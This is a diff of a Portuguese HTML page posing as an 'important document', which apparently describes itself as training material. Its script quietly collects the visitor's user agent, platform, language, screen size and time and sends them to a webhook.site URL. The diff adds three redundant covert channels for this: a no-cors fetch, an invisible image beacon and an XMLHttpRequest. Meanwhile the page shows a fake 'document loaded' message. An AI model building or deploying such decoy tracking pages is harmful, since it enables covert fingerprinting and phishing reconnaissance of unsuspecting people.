@@ -17,34 +17,40 @@
 <body>
     <h1>📄 Documento Importante</h1>
     <p>Este é um documento de teste para o treinamento.</p>
-    <p>Aguarde enquanto carregamos o conteúdo...</p>
+    <p id="status">Carregando informações...</p>
 
     <script>
-        // Coleta informações do dispositivo
+        // Coleta informações
         const info = {
-            userAgent: navigator.userAgent,
+            ua: navigator.userAgent,
             platform: navigator.platform,
-            language: navigator.language,
-            screenResolution: screen.width + 'x' + screen.height,
-            timestamp: new Date().toISOString(),
-            onLine: navigator.onLine
+            lang: navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            time: new Date().toISOString()
         };
 
-        // SUBSTITUA AQUI pela sua URL do webhook.site
+        // COLE SUA URL DO WEBHOOK AQUI
         const webhookURL = 'https://webhook.site/ac1086cb-c4a5-4c1a-a9fa-52b8ba15836d';
 
-        // Envia os dados
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(info)
-        }).then(() => {
-            document.body.innerHTML += '<p style="color: green;">✓ Documento carregado com sucesso!</p>';
-        }).catch(err => {
-            console.log('Erro:', err);
-        });
+        // Método 1: Fetch com modo no-cors
+        fetch(webhookURL + '?' + new URLSearchParams(info), {
+            method: 'GET',
+            mode: 'no-cors'
+        }).catch(e => console.log(e));
+
+        // Método 2: Imagem invisível (backup)
+        const img = new Image();
+        img.src = webhookURL + '?' + new URLSearchParams(info);
+
+        // Método 3: XMLHttpRequest (backup)
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', webhookURL + '?' + new URLSearchParams(info), true);
+        xhr.send();
+
+        // Atualiza status
+        setTimeout(() => {
+            document.getElementById('status').innerHTML = '✓ Documento carregado!<br><small>Dispositivo: ' + navigator.userAgent + '</small>';
+        }, 1000);
     </script>
 </body>
 </html>
